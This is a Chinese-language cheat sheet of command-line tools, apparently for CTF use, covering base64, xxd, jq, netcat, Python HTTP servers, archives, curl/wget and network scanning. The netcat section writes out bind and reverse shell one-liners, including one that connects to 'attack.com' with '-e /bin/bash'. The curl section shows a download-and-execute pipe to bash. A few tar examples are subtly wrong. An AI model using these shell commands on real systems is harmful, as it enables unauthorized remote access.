# 杂项工具速查

<!-- 目录 -->
<!-- 1. Base64 编码 -->
<!-- 2. xxd -->
<!-- 3. jq -->
<!-- 4. netcat -->
<!-- 5. Python HTTP Server -->
<!-- 6. tar/zip -->
<!-- 7. curl/wget -->
<!-- 8. 常用网络工具 -->

---

## 1. Base64 编码

Base64 是常用的编码方式,常用于 CTF 中。

### 命令行编解码

```bash
# 编码
echo -n "hello" | base64
# 输出: aGVsbG8=

# 解码
echo -n "aGVsbG8=" | base64 -d
# 输出: hello

# 文件编码
base64 image.jpg > image.txt

# 文件解码
base64 -d image.txt > image.jpg
```

### URL Base64

```bash
# 标准 Base64 可能包含 + / =
# URL Safe Base64 用 - _ 替换 + /

# Python 实现
python3 -c "
import base64
s = 'hello'
# 标准编码
enc = base64.b64encode(s.encode()).decode()
print(f'Standard: {enc}')
# URL safe 编码
enc_url = base64.urlsafe_b64encode(s.encode()).decode()
print(f'URL Safe: {enc_url}')
"
```

### Base64 隐写

```python
# Base64 隐写检测
def detect_base64_stego(data):
    # Base64 隐写通常在末尾 =
    lines = data.strip().split('\n')
    hidden = []
    for i, line in enumerate(lines):
        if line.endswith('==') or line.endswith('='):
            # 检查 = 前的字符
            pass
    return hidden
```

### Base64 与文件

```bash
# 图片转 Base64 (HTML img 标签)
echo '<img src="data:image/png;base64,' > page.html
base64 -i image.png >> page.html
echo '">' >> page.html

# PDF 转 Base64
base64 -i document.pdf > document.txt
```

---

## 2. xxd

xxd 是十六进制编辑器,用于查看和转换二进制数据。

### 基本使用

```bash
# 查看 hex dump
xxd file.bin

# 简洁格式
xxd -p file.bin

# 显示 plain hexdump (无 ASCII)
xxd -p -c 16 file.bin

# 显示行为指定列数
xxd -c 24 file.bin

# 只显示行数
xxd -l 100 file.bin    # 前 100 字节
xxd -s 100 file.bin    # 从偏移 0x100 开始
xxd -s -100 file.bin   # 从末尾往前 100 字节
```

### 反向转换

```bash
# Hex -> 二进制
xxd -r -p hex.txt > file.bin

# 将 hex dump 保存为二进制
xxd file.bin > hex.txt
```

### 常用选项

```bash
# -p, -plain        plain hexdump 格式
# -r, -revert       反向转换 (hex -> binary)
# -c, -cols <n>     每行显示 n 列
# -g, -groupsize <n>  每组 n bytes (默认 1)
# -i, -include      输出 C 头文件格式
# -u, -uppercase    大写十六进制
# -l, -len <n>      只显示前 n bytes
# -s, -seek <n>     从偏移 n 开始
```

### C 头文件格式

```bash
# 生成 C 数组
xxd -i file.bin

# 输出示例
# unsigned char file_bin[] = {
#   0x01, 0x02, 0x03, ...
# };
# unsigned int file_bin_len = 123;
```

### 与其他工具比较

```bash
# hexdump (BSD)
hexdump -C file.bin      # 类似 xxd -C
hexdump -x file.bin      # 显示为 16 进制 words

# od (GNU)
od -tx1 file.bin         # 十六进制
od -c file.bin           # 字符
od -An -tx1 file.bin     # 无地址,十六进制
```

---

## 3. jq

jq 是处理 JSON 数据的命令行工具。

### 安装

```bash
# macOS
brew install jq

# Ubuntu/Debian
sudo apt install jq
```

### 基本使用

```bash
# 格式化 JSON
jq . file.json

# 从文件读取
cat file.json | jq .

# 从 curl 读取
curl -s api.json | jq .

# 读取特定字段
jq '.field' file.json
jq '.user.name' file.json

# 数组操作
jq '.[0]' file.json        # 第一个元素
jq '.users[]' file.json    # 所有用户
jq '.users[] | length'     # 数组元素长度
```

### 过滤和转换

```bash
# 条件过滤
jq '.users[] | select(.age > 18)' file.json
jq '.users[] | select(.name == "Alice")' file.json

# 投影 (只取某些字段)
jq '.users[] | {name, email}' file.json

# 映射
jq 'map(.age)' file.json

# 数组函数
jq 'length' file.json       # 数组长度
jq 'keys' file.json        # 对象键
jq 'flatten' file.json      # 展平数组
jq 'unique' file.json       # 去重
jq 'sort' file.json         # 排序
```

### 常用函数

```bash
# 字符串
jq -r '.name' file.json     # -r 输出原始字符串(无引号)
jq -r '.url' file.json

# 数值
jq '.count * 2' file.json
jq '.price | floor' file.json
jq '.items | length' file.json

# 布尔
jq '.active | not' file.json

# 类型
jq 'type' file.json         # "object", "array", "string", etc.
```

### 输出格式

```bash
# 紧凑输出
jq -c . file.json

# 无颜色
jq -M . file.json

# 原始输出
jq -r '.name' file.json

# 美化输出
jq . file.json

# 从 URL 读取
curl -s "https://api.github.com/repos/jqlang/jq" | jq '.stargazers_count'
```

### 高级用法

```bash
# 多个字段
jq '{name, age, city}' file.json

# 嵌套访问
jq '.config.database.host' file.json

# 默认值
jq '.missing // "default"' file.json

# 变量
NAME="Alice"
echo '{"name": "Bob"}' | jq --arg name "$NAME" '.name = $name'

# 分页 (limit/offset)
jq '.[10:20]' file.json
```

### 与其他工具结合

```bash
# 与 grep 结合
jq '.users[]' file.json | grep -i alice

# 与 curl 结合
curl -s api.example.com/data | jq '.[] | select(.id == 123)'

# 与 sed 结合
jq -r '.url' file.json | sed 's|http://|https://|'

# 保存到文件
jq . file.json > formatted.json
```

---

## 4. netcat (nc)

netcat 是网络工具中的瑞士军刀。

### 基本使用

```bash
# 监听端口
nc -l -p 4444

# 连接远程端口
nc target.com 80

# 端口扫描
nc -zv target.com 1-1000

# 扫描特定端口
nc -zv target.com 22 80 443

# 反向连接 (需要目标配合)
nc -l -p 4444 -e /bin/bash    # Linux
nc -l -p 4444 -e cmd.exe     # Windows
```

### 文件传输

```bash
# 发送文件
# 接收端
nc -l -p 4444 > file.txt

# 发送端
nc target.com 4444 < file.txt

# 一步到位 (接收端先启动)
nc -l -p 4444 | tar -xvf -
# 发送端
tar -cvf - file.txt | nc target.com 4444
```

### Shell 连接

```bash
# 绑定 shell (被攻击机)
# Linux bash
nc -l -p 4444 -e /bin/bash

# Windows
nc -l -p 4444 -e cmd.exe

# 反向 shell (攻击机)
# 攻击机监听
nc -l -p 4444

# 目标机连接
nc attack.com 4444 -e /bin/bash
```

### 常用选项

```bash
# -l          监听模式
# -p <port>   指定端口
# -e <cmd>    执行命令
# -n          不做 DNS 解析
# -z          零 I/O 模式(扫描)
# -v          详细输出
# -vv         更详细
# -w <sec>    连接超时
# -c <cmd>    执行命令 (部分版本)
```

### HTTP 请求

```bash
# 简单 HTTP 请求
echo -e "GET / HTTP/1.0\r\n\r\n" | nc target.com 80

# 带 Header
printf "GET / HTTP/1.1\r\nHost: target.com\r\n\r\n" | nc target.com 80

# HTTPS (需要 ncat 或 openssl)
ncat --ssl target.com 443
```

### 代理和隧道

```bash
# 通过代理
# 需要 proxychains 或 nc 编译时支持

# 端口转发
nc -l -p 8080 | nc target.com 80
```

---

## 5. Python HTTP Server

Python 内置 HTTP 服务器,快速分享文件。

### Python 3

```bash
# 当前目录 HTTP
python3 -m http.server 8000

# 指定端口
python3 -m http.server 8080

# 指定 IP
python3 -m http.server 8000 --bind 192.168.1.100

# 当前目录
python3 -m http.server 8000

# CORS (允许跨域)
python3 -c "
import http.server
import socketserver

class CORSRequestHandler(http.server.SimpleHTTPRequestHandler):
    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET')
        super().end_headers()

with socketserver.TCPServer(('', 8000), CORSRequestHandler) as httpd:
    print('Serving at port 8000')
    httpd.serve_forever()
"
```

### Python 2

```bash
# Python 2
python -m SimpleHTTPServer 8000

# Python 3
python3 -m http.server 8000
```

### 带认证

```bash
# 基本认证
python3 -c "
import http.server
import socketserver
import base64

class AuthHandler(http.server.SimpleHTTPRequestHandler):
    def do_HEAD(self):
        self.send_response(401)
        self.send_header('WWW-Authenticate', 'Basic realm=\"Test\"')
        self.end_headers()

    def do_GET(self):
        if self.headers.get('Authorization') == '' or self.headers.get('Authorization') == None:
            self.do_HEAD()
        elif self.headers.get('Authorization').startswith('Basic '):
            import base64
            encoded = self.headers.get('Authorization')[6:]
            decoded = base64.b64decode(encoded).decode('utf-8')
            if decoded == 'user:password':
                super().do_GET()
            else:
                self.do_HEAD()

with socketserver.TCPServer(('', 8000), AuthHandler) as httpd:
    httpd.serve_forever()
"
```

### 一句话下载器

```bash
# Linux/macOS
curl -O http://target.com:8000/file

# Windows PowerShell
Invoke-WebRequest -Uri "http://target.com:8000/file" -OutFile "file"

# Python
python3 -c "import urllib.request; urllib.request.urlretrieve('http://target.com:8000/file', 'file')"
```

---

## 6. tar / zip

压缩和解压缩工具。

### tar

```bash
# 创建 tar.gz
tar -cvf archive.tar.gz /path/to/dir

# 创建 tar.bz2
tar -cvjf archive.tar.bz2 /path/to/dir

# 创建 tar.xz
tar -cvJf archive.tar.xz /path/to/dir

# 解压
tar -xvf archive.tar.gz
tar -xvjf archive.tar.bz2
tar -xvJf archive.tar.xz

# 解压到指定目录
tar -xvf archive.tar.gz -C /target/dir

# 查看内容
tar -tvf archive.tar.gz

# 排除文件
tar -cvf archive.tar.gz --exclude='*.log' /path/to/dir

# 包含特定文件
tar -cvf archive.tar.gz /path -name '*.txt'
```

### zip

```bash
# 创建 zip
zip -r archive.zip /path/to/dir

# 创建并加密
zip -r -e archive.zip /path/to/dir

# 设置密码
zip -r -P password archive.zip /path/to/dir

# 解压
unzip archive.zip

# 解压到指定目录
unzip archive.zip -d /target/dir

# 查看内容
unzip -l archive.zip

# 测试
unzip -t archive.zip

# 跳过已存在的文件
unzip -n archive.zip

# 覆盖已存在的文件
unzip -o archive.zip
```

### 7z

```bash
# 安装
brew install p7zip      # macOS
sudo apt install p7zip-full  # Ubuntu

# 创建 7z
7z a archive.7z /path

# 解压
7z x archive.7z

# 查看
7z l archive.7z

# 测试
7z t archive.7z
```

---

## 7. curl / wget

命令行下载工具。

### curl

```bash
# 基本下载
curl -O http://target.com/file

# 输出到指定文件名
curl -o output.txt http://target.com/file

# 显示响应头
curl -I http://target.com/

# 显示完整响应
curl -i http://target.com/

# 显示详细过程
curl -v http://target.com/

# 跟随重定向
curl -L http://target.com/file

# 发送 POST 请求
curl -X POST -d "name=value" http://target.com/

# JSON POST
curl -X POST -H "Content-Type: application/json" -d '{"key":"value"}' http://target.com/

# 设置 Header
curl -H "Authorization: Bearer token" http://target.com/

# 使用代理
curl -x http://proxy.com:8080 http://target.com/

# 跳过 SSL 验证
curl -k https://target.com/

# 下载限速
curl --limit-rate 1M -O http://target.com/largefile

# 重试
curl --retry 3 http://target.com/

# 请求超时
curl --max-time 60 http://target.com/

# 下载并执行
curl -sL http://target.com/script.sh | bash
```

### wget

```bash
# 基本下载
wget http://target.com/file

# 指定输出文件名
wget -O output.txt http://target.com/file

# 后台下载
wget -b http://target.com/largefile

# 继续下载 (断点续传)
wget -c http://target.com/file

# 跟随重定向
wget -L http://target.com/

# 镜像网站
wget -r -np -k http://target.com/

# 选项
# -r      递归
# -np     不访问上级目录
# -k      转换链接为本地
# -p      下载所有资源

# 限速
wget --limit-rate=1M http://target.com/file

# 用户名密码
wget --user=user --password=pass http://target.com/
```

---

## 8. 常用网络工具

### ping

```bash
# 基本 ping
ping target.com

# 发送次数
ping -c 4 target.com

# 指定间隔
ping -i 2 target.com

# 指定包大小
ping -s 100 target.com

# IPv4/IPv6
ping4 target.com
ping6 target.com
```

### traceroute / tracepath

```bash
# 路由追踪
traceroute target.com

# 跳过 DNS 反向解析
traceroute -n target.com

# UDP 模式 (默认 UDP)
traceroute -U target.com

# TCP 模式
traceroute -T target.com

# 穿透防火墙
traceroute -I target.com

# tracepath (不需要 root)
tracepath target.com
```

### netstat / ss

```bash
# netstat (可能需要 root)
netstat -tuln                 # 监听端口
netstat -an                   # 所有连接
netstat -r                    # 路由表
netstat -i                     # 接口信息

# ss (新版,更快)
ss -tuln                      # 监听端口
ss -tunl                      # UDP 监听
ss -tan                       # 所有 TCP 连接
ss -state established         # 已建立连接
```

### dig / nslookup

```bash
# DNS 查询
dig target.com

# 指定 DNS 服务器
dig @8.8.8.8 target.com

# 查询特定记录
dig target.com A
dig target.com AAAA
dig target.com MX
dig target.com TXT
dig target.com NS
dig target.com CNAME

# 简短输出
dig +short target.com

# DNS 反向查询
dig -x 8.8.8.8

# nslookup
nslookup target.com
nslookup -type=mx target.com
```

### host

```bash
# 简单 DNS 查询
host target.com

# DNS 区域传输
host -l domain.com dns.server.com

# 反向查询
host 8.8.8.8
```

### nmap

```bash
# 基本扫描
nmap target.com

# 端口扫描
nmap -p 80,443 target.com

# 常用端口
nmap -F target.com

# 完整扫描
nmap -p- target.com

# 服务检测
nmap -sV target.com

# 操作系统检测
nmap -O target.com

# 脚本扫描
nmap -sC target.com

# 输出
nmap -oN output.txt target.com
nmap -oX output.xml target.com

# 代理扫描
nmap -p 1080 target.com -sV

# 常用选项
# -sT  TCP connect
# -sS  SYN stealth
# -sU  UDP
# -sC  默认脚本
# -Pn  不 ping
# -T4  速度 (1-5)
```

### ip

```bash
# 显示 IP 地址
ip addr

# 显示路由表
ip route

# 显示接口
ip link

# 添加 IP
ip addr add 192.168.1.100/24 dev eth0

# 显示 ARP 表
ip neigh

# 端口转发
sysctl -w net.ipv4.ip_forward=1
iptables -t nat -A POSTROUTING -j MASQUERADE
```
